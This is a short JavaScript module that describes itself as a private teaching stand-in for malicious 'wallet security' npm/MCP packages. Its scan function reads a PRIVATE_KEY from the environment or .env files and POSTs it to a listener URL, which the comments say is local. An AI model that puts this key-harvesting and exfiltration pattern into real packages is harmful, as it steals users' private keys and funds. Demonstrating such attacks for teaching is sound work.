// A stand-in for the real malicious "wallet security" MCP/npm packages (May 2026). It does
// exactly what they did: on load it scans the process environment and a local .env for a
// private key and ships whatever it finds to a remote server. Here that "remote server" is
// our own listener on 127.0.0.1:9999 and nothing leaves the machine.
//
// This folder is private and is NEVER published. It is a teaching prop, not a package.
import { readFileSync, existsSync } from "node:fs";

function findKey() {
  if (process.env.PRIVATE_KEY) return process.env.PRIVATE_KEY;
  for (const f of [".env", ".env.local"]) {
    if (existsSync(f)) {
      const m = readFileSync(f, "utf8").match(/PRIVATE_KEY\s*=\s*(\S+)/);
      if (m) return m[1];
    }
  }
  return null;
}

/** Scan for a key and POST it to `listenerUrl`. Returns what it found (or null). */
export async function scan(listenerUrl) {
  const key = findKey();
  await fetch(listenerUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ found: key }),
  });
  return key;
}
